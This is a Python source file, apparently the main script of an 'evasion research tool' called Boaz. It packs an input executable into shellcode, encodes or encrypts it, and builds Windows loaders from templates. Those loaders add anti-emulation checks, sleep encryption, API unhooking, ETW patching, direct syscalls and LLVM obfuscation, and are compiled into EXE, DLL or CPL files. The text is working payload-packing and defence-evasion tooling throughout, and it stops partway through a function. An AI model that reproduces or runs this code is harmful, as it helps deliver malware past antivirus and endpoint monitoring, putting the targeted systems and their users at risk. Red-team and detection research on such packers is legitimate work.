# Boaz evasion research tool main script
# Author: thomas XM
# Date 2023
#
# This file is part of the Boaz tool
# Copyright (c) 2019-2024 Thomas M
# Licensed under the GPLv3 or later.
#
import argparse
import subprocess
import os
import re
import random
import string
import time
import glob
import sys

def check_non_negative(value):
    ivalue = int(value)
    if ivalue < 0:
        raise argparse.ArgumentTypeError("%s is an invalid non-negative int value" % value)
    return ivalue

def generate_random_filename(length=6):
    # Generate a random string of fixed length 
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

## .bin input file
def handle_star_dust(input_file):
    if not input_file.endswith('.bin'):
        print("Warning, Stardust needs a binary shellcode file .bin as input")
        # Exit the program if the input file is not a .bin file
        sys.exit(1)
    print(f"[!] Using Stardust to generate shellcode from binary file: {input_file}")
    # Run bin_to_c_array.py to convert .bin to C array and save it to ./shellcode.txt
    subprocess.run(['python3', 'encoders/bin_to_c_array.py', input_file, './shellcode.txt'], check=True)

    # Read the generated ./shellcode.txt to find the shellcode
    with open('./shellcode.txt', 'r') as file:
        content = file.read()

    # Find the position of "unsigned char buf[] ="
    start = content.find('unsigned char buf[] =')
    if start == -1:
        print("Error: 'unsigned char buf[] =' not found in shellcode.txt")
        return

    start += len('unsigned char buf[] =')
    end = content.find(';', start)
    shellcode = content[start:end].strip()

    ## Make a copy of Stardust/src/Main.c
    # subprocess.run(['cp', 'Stardust/src/Main.c', 'Stardust/src/Main.c.bak'], check=True)
    subprocess.run(['cp', 'Stardust/src/Main.c.bak', 'Stardust/src/Main.c'], check=True)

    # Replace the placeholder ####MAGICSPELL#### in Stardust/src/Main.c
    stardust_main_path = 'Stardust/src/Main.c'
    with open(stardust_main_path, 'r') as file:
        main_content = file.read()

    if '####MAGICSPELL####' not in main_content:
        print("Error: '####MAGICSPELL####' placeholder not found in Stardust/src/Main.c")
        return

    main_content = main_content.replace('####MAGICSPELL####', shellcode)

    # Write the updated content back to Stardust/src/Main.c
    with open(stardust_main_path, 'w') as file:
        file.write(main_content)

    
    # Run `make` command in the /Stardust directory
    subprocess.run(['make', '-C', './Stardust'], check=True)

    #
    # Copy the generated boaz.x64.bin to the current directory
    subprocess.run(['cp', 'Stardust/bin/boaz.x64.bin', '.'], check=True)
    # remove ./shellcode.txt after usage:
    subprocess.run(['rm', './shellcode.txt'], check=True)   
    # copy the original backup file back to Stardust/src/Main.c
    # subprocess.run(['cp', 'Stardust/src/Main.c.bak', 'Stardust/src/Main.c'], check=True)



def generate_shellcode(input_exe, output_path, shellcode_type, encode=False, encoding=None, star_dust=False):
    if not star_dust:
        # Generate the initial shellcode .bin file
        if shellcode_type == 'donut':
            cmd = ['./PIC/donut', '-b1', '-f1', '-i', input_exe, '-o', output_path + ".bin"]
        elif shellcode_type == 'pe2sh':
            cmd = ['wine', './PIC/pe2shc.exe', input_exe, output_path + ".bin"]
        elif shellcode_type == 'rc4':
            cmd = ['wine', './PIC/rc4_x64.exe', input_exe, output_path + ".bin", '-r']
            if subprocess.run(cmd, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
                # If rc4_x64.exe fails, try with rc4_x86.exe for 32-bit payloads
                cmd = ['wine', '/PIC/rc4_x86.exe', input_exe, output_path + ".bin", '-r']
        elif shellcode_type == 'amber':
            a_number = random.randint(1, 30)  
            # print(f"Encoding number: {a_number}")
            cmd = ['./PIC/amber', '-e', str(a_number), '--iat', '--scrape', '-f', input_exe, '-o', output_path + ".bin"]
        else:
            raise ValueError("Unsupported shellcode type.")

        # Run the initial shellcode generation command
        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # print the shellcode type used:
        print(f"[+] Shellcode type used: {shellcode_type}")
    
    elif star_dust:
        output_path = input_exe
    # print output_path
    print(f"[+] Shellcode saved to: {output_path}")
    ### TODO: add support for stardust option: 

    # If encode flag is True, use sgn to encode the shellcode
    if encode:
        random_count = random.randint(1, 100)  # Generate a random count between 1 and 100
        encoded_output_path = output_path + "1.bin"  # Specify the encoded output file path
        encode_cmd = ['./encoders/sgn', '-a', '64', '-i', output_path + ".bin", '-o', encoded_output_path]
        # encode_cmd = ['./sgn', '-a', '64', '-v', '-c', str(random_count), '-i', output_path + ".bin", '-o', encoded_output_path]
        try:
            subprocess.run(encode_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"Shellcode successfully encoded with {random_count} iterations.")
            print(f"Encoded shellcode saved to: {encoded_output_path}")
        except subprocess.CalledProcessError:
            print("Shellcode encoding failed.")       
        output_path_bin = encoded_output_path
    else:
        # If not encoding, keep using the original .bin file
        output_path_bin = output_path + ".bin"

    if encoding:
        encoding_output_path = output_path.replace(".bin", "")
        ## TODO: Add support for other encoding types
        if encoding == 'uuid':
            cmd = ['python3', './encoders/bin2uuid.py', output_path_bin, '>', encoding_output_path]
        if encoding == 'xor':
            cmd = ['python3', './encoders/bin2xor.py', output_path_bin, '>', encoding_output_path]
        elif encoding == 'mac':
            cmd = ['python3', './encoders/bin2mac.py', output_path_bin, '>', encoding_output_path]
        elif encoding == 'ipv4':
            cmd = ['python3', './encoders/bin2ipv4.py', output_path_bin, '>', encoding_output_path]
        elif encoding == 'base45':
            cmd = ['python3', './encoders/bin2base45.py', output_path_bin, '>', encoding_output_path]
        elif encoding == 'base64':
            cmd = ['python3', './encoders/bin2base64.py', output_path_bin, '>', encoding_output_path]
        elif encoding == 'base58':
            cmd = ['python3', './encoders/bin2base58.py', output_path_bin, '>', encoding_output_path]
        elif encoding == 'aes':
            cmd = ['python3', './encoders/bin2aes.py', output_path_bin, '>', encoding_output_path]
        elif encoding == 'aes2':
            cmd = ['python3', './encoders/bin2aes.py', output_path_bin, '>', encoding_output_path]
        elif encoding == 'chacha':
            cmd = ['python3', './encoders/bin2chacha.py', output_path_bin, '>', encoding_output_path]
        elif encoding == 'ascon':
            cmd = ['python3', './encoders/bin2ascon.py', output_path_bin, '>', encoding_output_path]
        subprocess.run(' '.join(cmd), shell=True, check=True)
        output_path = encoding_output_path   
        print(f"[+] Shellcode encoded with {encoding} and saved to: {output_path}")
    else:
        # Process the .bin file to a C char array if not using UUID
        process_cmd = ['python3', './encoders/bin_to_c_array.py', output_path_bin, output_path]
        subprocess.run(process_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # # Process the .bin file (encoded or original) to a C char array
    # process_cmd = ['python3', 'bin_to_c_array.py', output_path_bin, output_path]
    # subprocess.run(process_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def read_shellcode(file_path):
    with open(file_path, 'r') as file:
        content = file.read()
    # Extract the shellcode from the file content
    start = content.find('unsigned char buf[] = ') + len('unsigned char buf[] = ')
    end = content.rfind(';')
    shellcode = content[start:end].strip()
    return shellcode

# def insert_junk_api_calls(content, junk_api, main_func_pattern):
#     if not junk_api:
#         return content

#     # Add the include statement at the top
#     content = '#include "normal_api.h"\n' + content

#     # Find the main function's scope
#     # main_func_pattern = r'\bint\s+main\s*\([^)]*\)\s*\{'
#     match = re.search(main_func_pattern, content, re.MULTILINE)
#     if match:
#         start_pos = match.end()
#         # Find the position of the closing brace for main
#         end_pos = content.rfind('}', start_pos)
#         if end_pos == -1:
#             end_pos = len(content)

#         # Attempt to find "safe" lines by avoiding lines immediately following an opening brace or leading into a closing brace
#         lines = content[start_pos:end_pos].split('\n')
#         safe_lines = [i for i, line in enumerate(lines) if '{' not in line and '}' not in line and line.strip() != '']

#         if safe_lines:
#             # Choose a random line index from the safe ones, avoiding first and last line
#             chosen_line_index = random.choice(safe_lines[1:-1])
#             # Construct the modified content
#             indentation = '    ' 
#             modified_line = f"{indentation}executeAPIFunction();\n{lines[chosen_line_index]}" 
#             lines[chosen_line_index] = modified_line

#             # Reconstruct the content with the inserted call
#             content = content[:start_pos] + '\n'.join(lines) + content[end_pos:]

#     return content


def insert_junk_api_calls(content, junk_api, main_func_pattern):
    if not junk_api:
        return content

    # Adding the include at the top if not already included
    if '#include "normal_api.h"' not in content:
        content = '#include "normal_api.h"\n' + content

    # Find the opening of the main function
    main_start = re.search(main_func_pattern, content, re.MULTILINE)
    if main_start:
        # Find the index just after the opening brace of the main function
        open_brace_index = content.find('{', main_start.end()) + 1
        if open_brace_index > 0:
            # Find the end of the first complete statement after the opening brace
            statement_end = content.find(';', open_brace_index)
            if statement_end > 0:
                # Insert the API call after the first complete statement
                insert_position = statement_end + 1
                content = content[:insert_position] + '\n    executeAPIFunction();\n' + content[insert_position:]

    return content


# def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type, output_path, sleep_flag, anti_emulation, junk_api, api_unhooking, god_speed, encoding=None, dream_time=None, file_name=None, etw=False, compile_as_dll=False, compile_as_cpl = False, compile_as_exe = False, compile_as_scr = False, compile_as_sys = False, compile_as_dll = False, compile_as_drv = False, compile_as_ocx = False, compile_as_tlb = False, compile_as_tsp = False, compile_as_msc = False, compile_as_msi = False, compile_as_msp = False, compile_as_mst)
def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type, output_path, sleep_flag, anti_emulation, junk_api, api_unhooking, god_speed, encoding=None, dream_time=None, file_name=None, etw=False, compile_as_dll=False, compile_as_cpl = False, star_dust = False):

    # Adjust loader_template_path for DLL
    if compile_as_dll:
        loader_template_path = loader_template_path.replace('.c', '.dll.c')
        # Pattern for the DLL's entry function, need regex to replace this dumb form
        main_func_pattern = r"void CALLBACK ExecuteMagiccode\(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow\) \{"
    elif compile_as_cpl:
        loader_template_path = loader_template_path.replace('.c', '.cpl.c')
        # Pattern for the CPL's entry function
        main_func_pattern = r"LONG CALLBACK CPlApplet\(HWND hwndCPl, UINT uMsg, LPARAM lParam1, LPARAM lParam2\) \{"
    else:
        # Pattern for the standard main function in EXE
        main_func_pattern = r"\bint\s+main\s*\([^)]*\)\s*\{"

    with open(loader_template_path, 'r') as file:
        content = file.read()


    # Insert sleep encryption if dream flag is used
    if dream_time is not None:
        # Include the sleep_encrypt header
        content = '#include "sleep_encrypt.h"\n' + content
        ### statement to indicate to user that sweet dream is being used:
        print(f"SweetDream is being used with a dream time of {dream_time/1000} seconds.\n")
        # Find the main function and insert SweetSleep call
        # main_func_pattern = r'\bint\s+main\s*\([^)]*\)\s*\{'
        match = re.search(main_func_pattern, content, re.MULTILINE)
        if match:
            insert_pos = match.end()
            newline_pos = content.find('\n', insert_pos)
            if newline_pos != -1:
                next_line_start = newline_pos + 1
                sweet_sleep_call = f'    printf("[+] Encrypting Heaps/Stacks ...\\n\\n\\n");\n    SweetSleep({dream_time});\n'
                content = content[:next_line_start] + sweet_sleep_call + content[next_line_start:]

    if (encoding is not None):
        if not star_dust:
            encoded_output_path = f'note_{shellcode_type}'  #
        elif star_dust:
            encoded_output_path = f'boaz.x64'  #
        ## TODO: Add support for other encoding types
        if encoding == 'uuid':
            include_header = '#include "uuid_converter.h"\n'
        elif encoding == 'xor':
            include_header = '#include "xor_converter.h"\n'
        elif encoding == 'mac':
            include_header = '#include "mac_converter.h"\n'
        elif encoding == 'ipv4':
            include_header = '#include "ipv4_converter.h"\n'
        elif encoding == 'base45':
            include_header = '#include "base45_converter.h"\n'
        elif encoding == 'base64':
            include_header = '#include "base64_converter.h"\n'
        elif encoding == 'base58':
            include_header = '#include "base58_converter.h"\n'
        elif encoding == 'aes':
            include_header = '#include "aes_converter.h"\n'
        elif encoding == 'aes2':
            include_header = '#include "aes2_converter.h"\n'
        elif encoding == 'chacha':
            include_header = '#include "chacha_converter.h"\n'
        elif encoding == 'ascon':
            include_header = '#include "ascon_converter.h"\n'
        else:
            # Default to uuid if not specified for backward compatibility
            include_header = '#include "uuid_converter.h"\n'
            encoding = 'uuid'

        with open(encoded_output_path, 'r') as encoded_file:
            encoded_content = encoded_file.read()

        encoded_insertion = f"\n// {encoding.upper()}s generated from magic \n" + encoded_content
        magiccode_declaration = 'unsigned char magiccode[] ='

        if magiccode_declaration in content:
            content = content.replace(magiccode_declaration, '')
        placeholder = '####SHELLCODE####'
        if placeholder in content:
            content = content.replace(placeholder, encoded_insertion)
        else:
            if compile_as_dll:
                # Find the position of the closing brace for the DLL's entry function
                # main_index = content.find('void CALLBACK ExecuteMagiccode')
                main_index = content.find('void CALLBACK ExecuteMagiccode(')
            elif compile_as_cpl:
                main_index = content.find('LONG CALLBACK CPlApplet(')
            else:
                main_index = content.find('int main')
            if main_index != -1:
                content = content[:main_index] + encoded_insertion + "\n" + content[main_index:]
            # content = content[:main_index] + encoded_insertion + "\n" + content[main_index:]

        content = include_header + content
        if compile_as_dll:
            main_func_index = content.find('void CALLBACK ExecuteMagiccode(')
        elif compile_as_cpl:
            main_func_index = content.find('LONG CALLBACK CPlApplet(')
        else:
            main_func_index = content.find('int main(')
        if main_func_index != -1:
            opening_brace_index_main = content.find('{', main_func_index) + 1

        ### TODO: 
        if encoding == 'uuid':
            encoding_declaration_index = content.find('const char* UUIDs[]')
            conversion_logic_template = """
            constexpr int numUuids = sizeof(UUIDs) / sizeof(UUIDs[0]);
            unsigned char magiccode[numUuids * 16];
            unsigned char* magiccodePtr = magiccode;
            convertUUIDsToMagicCode(UUIDs, magiccodePtr, numUuids);
            printf("[+] MagicCodePtr size: %lu bytes\\n", sizeof(magiccodePtr));
            printf("[+] size of magiccode: %lu bytes\\n", sizeof(magiccode));
            """
        elif encoding == 'xor':
            encoding_declaration_index = content.find('unsigned char XORed[]')
            conversion_logic_template = """
            size_t dataSize = sizeof(XORed) / sizeof(XORed[0]);
            unsigned char magiccode[dataSize];
            xorDecode(XORed, magiccode, dataSize, XORkey);
            printf("[+] size of magiccode: %lu bytes\\n", sizeof(magiccode));
            """
        elif encoding == 'mac':
            encoding_declaration_index = content.find('const char* MAC[]')
            conversion_logic_template = """
            constexpr int numMac = sizeof(MAC) / sizeof(MAC[0]);
            unsigned char magiccode[numMac * 6];
            unsigned char* magiccodePtr = magiccode;
            CustomEthernetStringToAddressArray(MAC, numMac, magiccode);
            printf("[+] MagicCodePtr size: %lu bytes\\n", sizeof(magiccodePtr));
            printf("[+] size of magiccode: %lu bytes\\n", sizeof(magiccode));
            """
        elif encoding == 'ipv4':
            encoding_declaration_index = content.find('const char* IPv4s[]')
            conversion_logic_template = """
        constexpr int numIpv4 = sizeof(IPv4s) / sizeof(IPv4s[0]);
        unsigned char magiccode[numIpv4 * 4];
        unsigned char* magiccodePtr = magiccode;
        convertIPv4sToMagicCode(IPv4s, magiccodePtr, numIpv4);
        printf("[+] MagicCodePtr size: %lu bytes\\n", sizeof(magiccodePtr));
        printf("[+] size of magiccode: %lu bytes\\n", sizeof(magiccode));
        """
        elif encoding == 'base45':
            encoding_declaration_index = content.find('const char base45[]')
            conversion_logic_template = """
        DWORD decodedSize = CalculateBase45DecodedSize(base45);
        unsigned char magiccode[decodedSize];
        unsigned char* magiccodePtr = magiccode;
        if (CustomBase45ToBinary(base45, strlen(base45), magiccodePtr, &decodedSize)) {
            printf("Failed to decode base45 string\\n");
            free(magiccode); 
        }
        printf("[+] MagicCodePtr size: %lu bytes\\n", sizeof(magiccodePtr));
        printf("[+] size of magiccode: %lu bytes\\n", sizeof(magiccode));
        """
        elif encoding == 'base64':
            encoding_declaration_index = content.find('const char base64[]')
            conversion_logic_template = """
        DWORD decodedSize = CalculateDecodedSize(base64);
        unsigned char magiccode[decodedSize];
        unsigned char* magiccodePtr = magiccode;
        if (!CustomCryptStringToBinaryA(base64, strlen(base64), magiccodePtr, &decodedSize)) {
            printf("Failed to decode base64 string\\n");
            free(magiccode); 
        }
        printf("[+] MagicCodePtr size: %lu bytes\\n", sizeof(magiccodePtr));
        printf("[+] size of magiccode: %lu bytes\\n", sizeof(magiccode));
        """
        elif encoding == 'base58':
            encoding_declaration_index = content.find('const char base58[]')
            conversion_logic_template = """
        DWORD decodedSize = CalculateDecodedSizeBase58(base58);
        unsigned char magiccode[decodedSize];
        unsigned char* magiccodePtr = magiccode;
        if (!CustomCryptStringToBinaryA(base58, strlen(base58), magiccodePtr, &decodedSize)) {
            printf("Failed to decode base58 string\\n");
            free(magiccode); // Don't forget to free allocated memory on failure
        }
        printf("[+] MagicCodePtr size: %lu bytes\\n", sizeof(magiccodePtr));
        printf("[+] size of magiccode: %lu bytes\\n", sizeof(magiccode));
        """
        elif encoding == 'aes':
            encoding_declaration_index = content.find('unsigned char magiccode[]') 
            conversion_logic_template = """
        DWORD aes_length = sizeof(magiccode);

        DecryptAES((char*)magiccode, aes_length, AESkey, sizeof(AESkey));

        printf("[+] size of magiccode: %lu bytes\\n", sizeof(magiccode));
        """
        elif encoding == 'chacha':
            encoding_declaration_index = content.find('unsigned char magiccode[]')
            conversion_logic_template = """
    int lenMagicCode = sizeof(magic_code);

    unsigned char magiccode[lenMagicCode];

    test_decryption();

    chacha20_encrypt(magiccode, magic_code, lenMagicCode, CHACHA20key, CHACHA20nonce, 1);

    // print_decrypted_result(magiccode, lenMagicCode);
    printf("\\n");
        """
        elif encoding == 'ascon':
            encoding_declaration_index = content.find('unsigned char magiccode[]')
            conversion_logic_template = """
    SIZE_T lenMagicCode = sizeof(magic_code);
    unsigned char magiccode[lenMagicCode];

    cast6_decrypt(magic_code, lenMagicCode, CAST6key, magiccode);

    print_hex("magic code:", magiccode, lenMagicCode);

    printf("\\n");
        """
        elif encoding == 'aes2':
            encoding_declaration_index = content.find('unsigned char magiccode[]') 
            conversion_logic_template = (
                "        DWORD aes_length = sizeof(magiccode);\n"
                "        unsigned int half_length = aes_length / 2; \n"
                "        int sifu = 2897;\n"
                "        int ninja = 7987;\n"
                "        for (int i = 0; i < 100000000; i++) {\n"
                "            if(ninja == 7987 && i == 99527491 && sifu != 7987) {\n"
                "                    printf(\"[+] Sifu is not happy! \\n\");\n"
                "                    printf(\"Fibonacci number at position %d is %lld\\n\", 45, fibonacci(45));\n"
                "                    DecryptAES((char*)magiccode, half_length, AESkey, sizeof(AESkey));\n"
                "                }\n"
                "            \n"
                "            if(ninja != 2897 && i == 99527491 && sifu == 2897){\n"
                "                printFactorial(20);\n"
                "                printf(\"[+] Ninja is going to perform ninjutsu! \\n\");\n"
                "                HANDLE mutex;\n"
                "                mutex = CreateMutex(NULL, TRUE, \"muuuutttteeexxx\");\n"
                "                if (GetLastError() == ERROR_ALREADY_EXISTS) {\n"
                "                    DecryptAES((char*)(magiccode + half_length), half_length, AESkey, sizeof(AESkey));\n"
                "                    printf(\"Mutex already exists. \\n\");\n"
                "                } else {\n"
                "                    printf(\"Mutex does not exist. \\n\");\n"
                "                    startExe(\"" + file_name + "\");\n"
                "                    Sleep(100);\n"
                "                }\n"
                "                \n"
                "            }\n"
                "        }\n")

        if encoding_declaration_index != -1 and (encoding_declaration_index < main_func_index or main_func_index == -1):
            pass  # Placeholder for any specific logic when encoding declarations are outside main

        if encoding_declaration_index > main_func_index and main_func_index != -1:
            if encoding == 'base64' or encoding == 'base58':
                closing_brace_index = content.find('";', encoding_declaration_index) + 1
            else:
                closing_brace_index = content.find('};', encoding_declaration_index) + 1
            insertion_point = content.find('\n', closing_brace_index) + 1
        else:
            insertion_point = opening_brace_index_main if main_func_index != -1 else -1

        if insertion_point != -1:
            content = content[:insertion_point] + conversion_logic_template + content[insertion_point:]
        else:
            print("Error: Appropriate insertion place not found.")


    # Insert API unhooking if the flag is set
    if api_unhooking:
        # Ensure #include "api_untangle.h" is added at the top of the file
        content = '#include "api_untangle.h"\n' + content
        # Insert ExecuteModifications at the beginning of the main function
        # main_func_pattern = r'\bint\s+main\s*\([^)]*\)\s*\{'
        match = re.search(main_func_pattern, content, re.MULTILINE)
        if match:
            insert_pos = match.end()
            newline_pos = content.find('\n', insert_pos)
            if newline_pos != -1:
                next_line_start = newline_pos + 1
                indentation = '    '  
                execute_modifications_call = f"{indentation}ExecuteModifications(argc, argv);\n"
                content = content[:next_line_start] + execute_modifications_call + content[next_line_start:]

    # Insert junk API calls if the flag is set
    content = insert_junk_api_calls(content, junk_api, main_func_pattern)

    # Replace the placeholder with the actual shellcode
    if (encoding == None):
        content = content.replace('####SHELLCODE####', shellcode)

    if anti_emulation:
        content = '#include "anti_emu.h"\n' + content

# ETW patching functionality
    if etw:
        # Include the ETW patch header at the top
        content = '#include "etw_pass.h"\n' + content
        # Find the appropriate place to insert the ETW patch code, insert after the call to `executeAllChecksAndEvaluate();`
        # main_func_pattern = r'\bint\s+main\s*\([^)]*\)\s*\{'
        match = re.search(main_func_pattern, content, re.MULTILINE)
        if match:
            insert_pos = content.find('executeAllChecksAndEvaluate();', match.end())
            if insert_pos != -1:
                insert_pos += len('executeAllChecksAndEvaluate();') + 1
            else:
                # If specific call to `executeAllChecksAndEvaluate();` not found, just insert after opening brace of main
                insert_pos = match.end() + 1
            
            etw_patch_code = '''
        if (everyThing() == EXIT_SUCCESS) {
            printf("\\n[+] ETW Patched Successfully...\\n");
        } else {
            printf("\\n[-] ETW Patch Failed...\\n");
        }
    '''
            # Insert the ETW patch code at the determined position
            content = content[:insert_pos] + etw_patch_code + content[insert_pos:]

    if god_speed:
        content = '#include "god_speed.h"\n' + content

    # main_func_pattern = r'\bint\s+main\s*\([^)]*\)\s*\{'
    match = re.search(main_func_pattern, content, re.MULTILINE)
    if match:
        insert_pos = match.end()
        newline_pos = content.find('\n', insert_pos)
        if newline_pos != -1:
            next_line_start = newline_pos + 1
            indentation_match = re.match(r'\s*', content[next_line_start:])
            indentation = indentation_match.group(0) if indentation_match else ''
            function_calls = ''
            if anti_emulation:
                ## TODO: add file name to check: 
                # function_calls += f"{indentation}executeAllChecksAndEvaluate();\n"
                # either compile_as_dll or compile_as_cpl is true, then we need to pass the file name to the function
                if compile_as_dll or compile_as_cpl:
                    function_call = f"executeAllChecksAndEvaluate();"
                else:
                    function_call = f"executeAllChecksAndEvaluate(\"{file_name}\", argv[0]);" if file_name is not None else "executeAllChecksAndEvaluate();"
                function_calls += f"{indentation}{function_call}\n"
            if god_speed:
                # Ensure ExecuteProcessOperations(); is placed right after executeAllChecksAndEvaluate(); if both flags are set
                function_calls += f"{indentation}ExecuteProcessOperations();\n"
            content = content[:next_line_start] + function_calls + content[next_line_start:]
  

    # Existing logic for inserting performSweetSleep(); remains unchanged...
    if sleep_flag:
        # Ensure #include "sweet_sleep.h" is added at the top of the file
        if '#include "sweet_sleep.h"' not in content:
            content = '#include "sweet_sleep.h"\n' + content

        # Use a regular expression to find the opening brace of the main function
        match = re.search(main_func_pattern, content, re.MULTILINE)
        if match:
            insert_pos = match.end()
            newline_pos = content.find('\n', insert_pos)
            if newline_pos != -1:
                next_line_start = newline_pos + 1
                next_line_end = content.find('\n', next_line_start)
                next_line_content = content[next_line_start:next_line_end]
                indentation_match = re.match(r'\s*', next_line_content)
                indentation = indentation_match.group(0) if indentation_match else ''
                sleep_call_with_indentation = f"{indentation}performSweetSleep();\n"
                # Ensure sleep call is added after anti-emulation call if both flags are set
                content = content[:next_line_start] + sleep_call_with_indentation + content[next_line_start:]

    # Write to the new loader file
    with open(output_path, 'w') as file:
        file.write(content)


def run_obfuscation(loader_path):

    obf_file = loader_path.replace('.c', '_obf.c')
    patch_file = loader_path + '.patch' 

    try:
        subprocess.run(['sudo', 'bash', './obfuscate/obfuscate_file.sh', loader_path], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # Check if the patch file exists and rename it to obf_file
        if os.path.exists(patch_file):
            os.rename(patch_file, obf_file)
        else:
            print(f"Expected patch file not found: {patch_file}. Obfuscation may have failed.")
    except subprocess.CalledProcessError as e:
        print(f"Warning: Obfuscation step has some errors {e}. But do not worry, proceeding with the next steps.")
        # Since obf_file is now defined outside of the try block, it can be safely used here
        if os.path.exists(patch_file):
            os.rename(patch_file, obf_file)


def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulation, insert_junk_api_calls, api_unhooking=False, mllvm_options=None, god_speed=False, encoding=None, loader_number=1, dream=None, etw=False, compile_as_dll=False, compile_as_cpl = False):

    if loader_number == 1 or 39 or 40 or 41:
        try:
            subprocess.run(['nasm', '-f', 'win64', 'assembly.asm', '-o', 'assembly.o'], check=True)
            print("[+] NASM assembly compilation successful.")
        except subprocess.CalledProcessError as e:
            print(f"[-] NASM assembly compilation failed: {e}")
            return  # Exit the function if NASM compilation fails

    output_dir = os.path.dirname(output_name)
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    if compiler == "mingw":
        compile_command = ['x86_64-w64-mingw32-g++', '-I.', '-I./converter', '-I./evader', loader_path]
        if compile_as_dll:
            compile_command.append('-shared')
            compile_command.append('-lntdll')
        elif compile_as_cpl:
            compile_command.append('-shared')
        compile_command.extend(['-o', output_name])
    elif compiler == "pluto":
        # Default LLVM passes for Pluto, if any, can be specified here
        mllvm_passes = ','.join(mllvm_options) if mllvm_options else ""
        # compile_command = ['./llvm_obfuscator_pluto/bin/clang++', '-O3', '-flto', '-fuse-ld=lld',
        #                    '-mllvm', f'-passes={mllvm_passes}',
        #                    '-Xlinker', '-mllvm', '-Xlinker', '-passes=hlw,idc',
        #                    '-target', 'x86_64-w64-mingw32', loader_path,
        #                    '-o', output_name, '-v', '-L/usr/lib/gcc/x86_64-w64-mingw32/12-win32',
        #                    '-L./clang_test_include', '-I./c++/', '-I./c++/mingw32/']
        compile_command = ['./llvm_obfuscator_pluto/bin/clang++', '-I.', '-I./converter', '-I./evader', '-O3', '-flto', '-fuse-ld=lld',
                        '-mllvm', f'-passes={mllvm_passes}',
                        '-Xlinker', '-mllvm', '-Xlinker', '-passes=hlw,idc',
                        '-target', 'x86_64-w64-mingw32', '-I.', '-I./converter', '-I./evader', loader_path]
        if compile_as_dll:
            compile_command.append('-shared')
            compile_command.append('-lntdll')
            output_name = output_name.replace('.exe', '.dll')
        elif compile_as_cpl:
            compile_command.append('-shared')
            output_name = output_name.replace('.exe', '.cpl')
        compile_command.extend(['-o', output_name, '-v', '-L/usr/lib/gcc/x86_64-w64-mingw32/12-win32',
                                '-L./clang_test_include', '-I./c++/', '-I./c++/mingw32/'])
    elif compiler == "akira":
        # Default LLVM options for Akira
        # default_akira_options = ['-irobf-indbr', '-irobf-icall', '-irobf-indgv', '-irobf-cse', '-irobf-cff']
        # akira_options = mllvm_options if mllvm_options else default_akira_options
        # compile_command = ['./akira_built/bin/clang++', '-target', 'x86_64-w64-mingw32', loader_path, '-o', output_name, '-v', '-L/usr/lib/gcc/x86_64-w64-mingw32/12-win32', '-L./clang_test_include', '-I./c++/', '-I./c++/mingw32/']
        # for option in akira_options:
        #     compile_command.extend(['-mllvm', option])
        default_akira_options = ['-irobf-indbr', '-irobf-icall', '-irobf-indgv', '-irobf-cse', '-irobf-cff']
        akira_options = mllvm_options if mllvm_options else default_akira_options
        compile_command = ['./akira_built/bin/clang++', '-I.', '-I./converter', '-I./evader', '-target', 'x86_64-w64-mingw32', '-I.', '-I./converter', '-I./evader', loader_path]
        if compile_as_dll:
            compile_command.append('-shared')
            compile_command.append('-lntdll')
            output_name = output_name.replace('.exe', '.dll')
        elif compile_as_cpl:
            compile_command.append('-shared')
            output_name = output_name.replace('.exe', '.cpl')
        compile_command.extend(['-o', output_name, '-v', '-L/usr/lib/gcc/x86_64-w64-mingw32/12-win32',
                                '-L./clang_test_include', '-I./c++/', '-I./c++/mingw32/'])
        for option in akira_options:
            compile_command.extend(['-mllvm', option])

    if anti_emulation:
        compile_command.extend(['./evader/anti_emu.c', '-lws2_32', '-lpsapi'])
    if etw:
        compile_command.append('./evader/etw_pass.c')
    ## TODO: Add support for other encoding types
    if encoding == 'uuid':
        compile_command.append('./converter/uuid_converter.c')
    elif encoding == 'xor':
        compile_command.append('./converter/xor_converter.c')
    elif encoding == 'mac':
        compile_command.append('./converter/mac_converter.c')
    elif encoding == 'ipv4':
        compile_command.append('./converter/ipv4_converter.c')
    elif encoding == 'base45':
        compile_command.append('./converter/base45_converter.c')
    elif encoding == 'base64':
        compile_command.append('./converter/base64_converter.c')
    elif encoding == 'base58':
        compile_command.append('./converter/base58_converter.c')
    elif encoding == 'aes': 
        compile_command.append('./converter/aes_converter.c')
    elif encoding == 'chacha':
        compile_command.append('./converter/chacha_converter.c')
    elif encoding == 'aes2':
        compile_command.append('./converter/aes2_converter.c')
    elif encoding == 'ascon':
        compile_command.append('./converter/ascon_converter.c')
    if dream:
        compile_command.append('./evader/sleep_encrypt.c')
    if god_speed:
        compile_command.append('./evader/god_speed.c')
    if sleep_flag:
        compile_command.append('./evader/sweet_sleep.c')
    if insert_junk_api_calls:
        compile_command.append('./evader/normal_api.c')
    if api_unhooking:
        compile_command.append('./evader/api_untangle.c')
    compile_command.append('-static-libgcc')
    compile_command.append('-static-libstdc++')
    compile_command.append('-lole32')
    if loader_number == 33: 
        compile_command.append('./syscall.c')
        compile_command.append('assembly.o')
    if loader_number == 1 or 39 or 40 or 41:
        compile_command.append('assembly.o')
        compile_command.append('-luuid')

    try:
        subprocess.run(compile_command, check=True)
        ### suppress output:
        # subprocess.run(compile_command, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"\033[95m[+] Congratulations!\033[0m The packed binary has been successfully generated: \033[91m{output_name}\033[0m")
    except subprocess.CalledProcessError as e:
        print(f"[-] Compilation failed: {e}")


def compile_with_syswhisper(loader_path, output_name, syswhisper_option, sleep_flag, anti_emulation, insert_junk_api_calls, compiler, api_unhooking, god_speed=False, encoding=None, dream=None, etw=False):
    # Create output directory if it doesn't exist
    output_dir = os.path.dirname(output_name)
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    common_sources = ['./classic_stubs/syscalls.c', './classic_stubs/syscallsstubs.std.x64.s']
    # Additional source files based on flags
    additional_sources = []
    if anti_emulation:
